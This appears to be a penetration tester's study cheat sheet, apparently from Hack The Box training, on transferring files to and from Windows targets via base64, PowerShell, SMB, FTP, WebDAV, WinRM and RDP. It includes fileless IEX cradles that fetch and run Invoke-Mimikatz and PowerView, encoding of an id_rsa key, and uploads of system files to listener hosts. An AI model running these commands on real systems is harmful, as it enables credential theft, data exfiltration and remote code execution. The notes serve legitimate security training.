### Base 64 transfer file without actually downloading anything

Check HASH of original file 
```shell
md5sum id_rsa
```
Encode to base 64 
```shell
cat id_rsa |base64 -w 0;echo
```
Copy and paste across, decode with powershell

```powershell
PS C:\htb> [IO.File]::WriteAllBytes("Details.txt", [Convert]::FromBase64String("<base 64>"))
```

# Downloads
## PowerShell Web Downloads
[Using System.Net.WebClient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)

|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```

```powershell
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

### Fileless
Download and execute directly. 
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Slow Method:
```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

### Common PowerShell errors

#### Internet Explorer first launch has not been configured 
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
```

#### Certificate Not Trusted
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```


## SMB Downloads

Create an SMB Share 
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
Copy the file 
```cmd-session
copy \\<local>\<file>
```

Security Policy Issue?
```shell
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```cmd
net use n: \\192.168.220.133\share /<user>:<test> <folder>
```

## FTP Downloads 
Set Up FTP server 
```shell
sudo pip3 install pyftpdlib
```

```shell
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object(Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')
```
### Command File 

```shell
echo open <ip> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET <file> >> ftpcommand.txt
echo bye >> ftpcommand.txt
```
```cmd-session
ftp -v -n -s:ftpcommand.txt
```

# Upload
### Base 64 
```powershell
[Convert]::ToBase64String((Get-Content -path "<path>" -Encoding byte))
```

```shell
echo <flie | base64 -d > <filename>
```

```shell
md5sum hosts 
```

### Web Uploads 
```shell
pip3 install uploadserver
```
```shell
python3 -m uploadserver
```

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://<ip>:8000/upload -File <path to file>
```

#### Base 64 uploads
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<path to file>))
```

```shell
nc -lvnp 8000
```

```powershell
Invoke-WebRequest -Uri http://<ip>:8000/ -Method POST -Body $b64
```

### SMB Uploads 
[SMB is often prevented from leaving local network](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)

SMB over HTTP with WebDav.WebDAV
```shell
sudo pip install wsgidav cheroot
```
```shell
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```
attempt to connect to share 
```cmd-session
dir \\<ip>\Directory
```
Upload Files 
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```
### FTP Uploads 

```shell
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
New-Object Net.WebClient).UploadFile('ftp://<ip>/ftp-hosts', 'path to file')
```

#### Command File
```shell
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
# [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2)

By default creates HTTP and HTTPS listeners.

Confirm WinRM port 5985 is Open on Computer. 
```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
Create powershell remote session 
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```
Attacker to Target:
```powershell
Copy-Item -Path <local machine file path> -ToSession $Session -Destination <output>
```
Target to Attacker 
```powershell
Copy-Item -Path "<file path>" -Destination C:\ -FromSession $Session
```


# RDP
## Shared Folders
### rdesktop 
```shell
rdesktop <ip> -d HTB -u <user> -p '<password>' -r disk:linux='<folder loc>'
```

### xfreerdp
```shell
xfreerdp /v:<ip> /d:HTB /u:<user> /p:'<passsword>' /drive:linux,<folder loc> /scale-desktop:200 /scale:180
```
